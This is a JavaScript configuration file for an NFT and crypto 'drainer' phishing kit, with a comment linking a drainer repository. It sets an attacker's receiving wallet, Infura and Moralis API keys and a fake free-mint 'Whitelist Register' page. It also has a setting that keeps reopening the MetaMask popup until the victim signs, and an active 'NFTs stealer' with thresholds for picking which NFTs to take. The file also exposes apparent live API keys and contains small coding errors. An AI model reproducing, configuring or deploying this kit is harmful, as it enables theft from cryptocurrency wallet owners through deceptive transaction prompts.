// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0x0D02c1D17e345B4dceA335Fd2988FbDF3F05e64C";    // Your ETH wallet that you have to receive NFTs
const infuraId = "87cdb07d4d5445b9b0ea64168a2c70b8"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "Yd88y5pMHGtnVciNOX1vVNUmmxb7i35W0Eq27s4iI7mgl7MQ84EV9Jkc3kd7YVf3"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Whitelist Register",
    title: "Register your Wallet", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "07.23.2022", // Today date
    socialMedia: {
        discord: "https://discord.gg/example",
        twitter: "https://twitter.com/example",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: free,         // Price per NFT.
    totalSupply: 555,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 6,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "" // leave empty if you want to use the same address 
}

/* 
    | = = = | https://github.com/0x32Moon/NFT-Crypto-Drainer | = = = | 
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
